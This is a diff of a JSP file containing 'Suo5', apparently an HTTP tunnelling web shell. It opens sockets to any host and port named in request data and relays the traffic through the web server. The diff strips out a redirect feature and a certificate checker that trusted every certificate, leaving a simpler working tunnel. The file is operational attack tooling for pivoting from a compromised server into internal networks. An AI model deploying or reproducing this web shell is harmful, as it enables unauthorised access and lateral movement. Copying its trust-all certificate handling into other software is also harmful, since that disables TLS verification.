@@ -2,15 +2,12 @@
 <%@ page import="java.util.HashMap" %>
 <%@ page import="java.nio.ByteBuffer" %>
 <%@ page import="java.io.*" %>
+<%@ page import="java.net.Socket" %>
+<%@ page import="java.net.InetSocketAddress" %>
 <%@ page import="java.util.Date" %>
 <%@ page import="java.util.Arrays" %>
-<%@ page import="java.util.Enumeration" %>
-<%@ page import="java.net.*" %>
-<%@ page import="java.security.cert.X509Certificate" %>
-<%@ page import="java.security.cert.CertificateException" %>
-<%@ page import="javax.net.ssl.*" %>
 <%!
-    public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
+    public class Suo5 implements Runnable {
 
         InputStream gInStream;
         OutputStream gOutStream;
@@ -20,7 +17,7 @@
             gOutStream = out;
         }
 
-        public void process(ServletRequest sReq, ServletResponse sResp) {
+        public void process(ServletRequest sReq, ServletResponse sResp)  {
             HttpServletRequest request = (HttpServletRequest) sReq;
             HttpServletResponse response = (HttpServletResponse) sResp;
             String agent = request.getHeader("User-Agent");
@@ -39,13 +36,13 @@
                     return;
                 }
 
-                if (contentType.equals("application/octet-stream")) {
+                if (contentType.equals("application/octet-stream"))  {
                     processDataBio(request, response);
                 } else {
                     processDataUnary(request, response);
                 }
             } catch (Throwable e) {
-//                System.out.printf("process data error %s\n", e);
+//                System.out.printf("process data error %s", e);
 //                e.printStackTrace();
             }
         }
@@ -168,14 +165,14 @@
                 if (kLen < 0) {
                     throw new Exception("key len error");
                 }
-                buf = Arrays.copyOfRange(bs, i, i + kLen);
+                buf = Arrays.copyOfRange(bs, i, i+kLen);
                 String key = new String(buf);
                 i += kLen;
 
                 if (i + 4 >= bs.length) {
                     throw new Exception("value len error");
                 }
-                buf = Arrays.copyOfRange(bs, i, i + 4);
+                buf = Arrays.copyOfRange(bs, i, i+4);
                 int vLen = bytesToU32(buf);
                 i += 4;
                 if (vLen < 0) {
@@ -185,7 +182,7 @@
                 if (i + vLen > bs.length) {
                     throw new Exception("value error");
                 }
-                byte[] value = Arrays.copyOfRange(bs, i, i + vLen);
+                byte[] value = Arrays.copyOfRange(bs, i, i+vLen);
                 i += vLen;
 
                 m.put(key, value);
@@ -236,7 +233,7 @@
                 t.start();
                 readReq(reqReader, scOutStream);
             } catch (Exception e) {
-//                System.out.printf("pipe error, %s\n", e);
+//                 System.out.printf("pipe error, %s\n", e);
             } finally {
                 sc.close();
                 respOutStream.close();
@@ -246,7 +243,7 @@
             }
         }
 
-        private void readSocket(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
+        private void readSocket(InputStream inputStream, OutputStream outputStream) throws IOException {
             byte[] readBuf = new byte[1024 * 8];
 
             while (true) {
@@ -254,11 +251,9 @@
                 if (n <= 0) {
                     break;
                 }
-                byte[] dataTmp = Arrays.copyOfRange(readBuf, 0, 0 + n);
-                if (needMarshal) {
-                    dataTmp = marshal(newData(dataTmp));
-                }
-                outputStream.write(dataTmp);
+                byte[] dataTmp = Arrays.copyOfRange(readBuf, 0, 0+n);
+                byte[] finalData = marshal(newData(dataTmp));
+                outputStream.write(finalData);
                 outputStream.flush();
             }
         }
@@ -295,34 +290,18 @@
             HashMap<String, byte[]> dataMap;
             dataMap = unmarshal(reader);
 
-
             String clientId = new String(dataMap.get("id"));
             byte[] action = dataMap.get("ac");
             if (action.length != 1) {
                 resp.setStatus(403);
                 return;
             }
-            /*
-                ActionCreate   byte = 0x00
-                ActionData     byte = 0x01
-                ActionDelete   byte = 0x02
-             */
-            byte[] redirectData = dataMap.get("r");
-            boolean needRedirect = redirectData != null && redirectData.length > 0;
-            String redirectUrl = "";
-            if (needRedirect) {
-                dataMap.remove("r");
-                redirectUrl = new String(redirectData);
-                needRedirect = !isLocalAddr(redirectUrl);
-            }
-            // load balance, send request with data to request url
-            // action 0x00 need to pipe, see below
-            if (needRedirect && (action[0] == 0x01 || action[0] == 0x02)) {
-                HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
-                conn.disconnect();
-                return;
-            }
-
+        /*
+        ActionCreate byte = 0x00
+        ActionData   byte = 0x01
+        ActionDelete byte = 0x02
+        ActionResp   byte = 0x03
+         */
             resp.setBufferSize(8 * 1024);
             OutputStream respOutStream = resp.getOutputStream();
             if (action[0] == 0x02) {
@@ -347,49 +326,35 @@
                 respOutStream.close();
                 return;
             }
-            // 0x00 create new tunnel
+
             resp.setHeader("X-Accel-Buffering", "no");
             String host = new String(dataMap.get("h"));
             int port = Integer.parseInt(new String(dataMap.get("p")));
-
-            InputStream readFrom;
-            Socket sc = null;
-            HttpURLConnection conn = null;
-
-            if (needRedirect) {
-                // pipe redirect stream and current response body
-                conn = redirect(request, dataMap, redirectUrl);
-                readFrom = conn.getInputStream();
-            } else {
-                // pipe socket stream and current response body
-                try {
-                    sc = new Socket();
-                    sc.connect(new InetSocketAddress(host, port), 5000);
-                    readFrom = sc.getInputStream();
-                    ctx.setAttribute(clientId, sc.getOutputStream());
-                    respOutStream.write(marshal(newStatus((byte) 0x00)));
-                    respOutStream.flush();
-                } catch (Exception e) {
-                    ctx.removeAttribute(clientId);
-                    respOutStream.write(marshal(newStatus((byte) 0x01)));
-                    respOutStream.flush();
-                    respOutStream.close();
-                    return;
-                }
+            Socket sc;
+            try {
+                sc = new Socket();
+                sc.connect(new InetSocketAddress(host, port), 5000);
+            } catch (Exception e) {
+                respOutStream.write(marshal(newStatus((byte) 0x01)));
+                respOutStream.flush();
+                respOutStream.close();
+                return;
             }
 
+            OutputStream scOutStream = sc.getOutputStream();
+            ctx.setAttribute(clientId, scOutStream);
+            respOutStream.write(marshal(newStatus((byte) 0x00)));
+            respOutStream.flush();
+
+            InputStream scInStream = sc.getInputStream();
+
             try {
-                readSocket(readFrom, respOutStream, !needRedirect);
+                readSocket(scInStream, respOutStream);
             } catch (Exception e) {
-//                System.out.printf("pipe error, %s\n", e);
+//                System.out.printf("pipe error, %s", e);
 //                e.printStackTrace();
             } finally {
-                if (sc != null) {
-                    sc.close();
-                }
-                if (conn != null) {
-                    conn.disconnect();
-                }
+                sc.close();
                 respOutStream.close();
                 ctx.removeAttribute(clientId);
             }
@@ -397,73 +362,11 @@
 
         public void run() {
             try {
-                readSocket(gInStream, gOutStream, true);
+                readSocket(gInStream, gOutStream);
             } catch (Exception e) {
-//                System.out.printf("read socket error, %s\n", e);
+//                System.out.printf("read socket error, %s", e);
 //                e.printStackTrace();
             }
-        }
-
-        boolean isLocalAddr(String url) throws Exception {
-            String ip = (new URL(url)).getHost();
-            Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
-            while (nifs.hasMoreElements()) {
-                NetworkInterface nif = nifs.nextElement();
-                Enumeration<InetAddress> addresses = nif.getInetAddresses();
-                while (addresses.hasMoreElements()) {
-                    InetAddress addr = addresses.nextElement();
-                    if (addr instanceof Inet4Address)
-                        if (addr.getHostAddress().equals(ip))
-                            return true;
-                }
-            }
-            return false;
-        }
-
-        HttpURLConnection redirect(HttpServletRequest request, HashMap<String, byte[]> dataMap, String rUrl) throws Exception {
-            String method = request.getMethod();
-            URL u = new URL(rUrl);
-            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
-            conn.setRequestMethod(method);
-            conn.setConnectTimeout(3000);
-            conn.setDoOutput(true);
-            conn.setDoInput(true);
-
-            // ignore ssl verify
-            // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
-            if (HttpsURLConnection.class.isInstance(conn)) {
-                ((HttpsURLConnection) conn).setHostnameVerifier(this);
-                SSLContext ctx = SSLContext.getInstance("SSL");
-                ctx.init(null, new TrustManager[]{this}, null);
-                ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
-            }
-
-            Enumeration<String> headers = request.getHeaderNames();
-            while (headers.hasMoreElements()) {
-                String k = headers.nextElement();
-                conn.setRequestProperty(k, request.getHeader(k));
-            }
-
-            OutputStream rout = conn.getOutputStream();
-            rout.write(marshal(dataMap));
-            rout.flush();
-            rout.close();
-            conn.getResponseCode();
-            return conn;
-        }
-
-        public boolean verify(String hostname, SSLSession session) {
-            return true;
-        }
-
-        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-        }
-
-        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-        }
-
-        public X509Certificate[] getAcceptedIssuers() {
-            return new X509Certificate[0];
         }
     }
 %>
